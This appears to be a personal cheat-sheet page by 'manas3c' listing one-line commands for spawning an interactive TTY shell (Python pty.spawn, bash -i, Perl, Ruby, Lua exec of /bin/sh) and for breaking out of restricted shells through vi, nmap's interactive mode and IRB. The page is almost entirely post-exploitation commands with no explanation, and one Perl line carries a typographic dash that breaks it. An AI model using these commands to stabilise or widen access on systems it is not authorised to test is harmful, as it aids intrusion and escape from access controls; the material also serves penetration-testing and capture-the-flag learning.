---
layout: default
title : manas3c - Spawning A TTY Shell, Cheat Sheets
---

Cheat Sheets For Spawning A TTY Shell.

```python -c 'import pty; pty.spawn("/bin/sh")'```

```python -c 'import pty; pty.spawn("/bin/bash")'```

```python3 -c 'import pty; pty.spawn("/bin/sh")'```

```python3 -c 'import pty; pty.spawn("/bin/bash")'```

```/bin/bash -i```

```/bin/sh -i```

```echo os.system('/bin/bash')```

```perl —e 'exec "/bin/sh";'```

```perl: exec "/bin/sh";```

```ruby: exec "/bin/sh"```

```lua: os.execute('/bin/sh')```

Bypassing Shell Restriction And Spawning A TTY Shell.

Within Vi

```:set shell=/bin/bash:shell```

Within Vi

```:!bash```

Within Nmap

```nmap --interactive``` Now Type ```!sh```

Within IRB

```exec "/bin/sh"```

Greeting From [manas3c](https://twitter.com/manas3c)

<br> <br>
[Back To Home](../index.md)
<br>
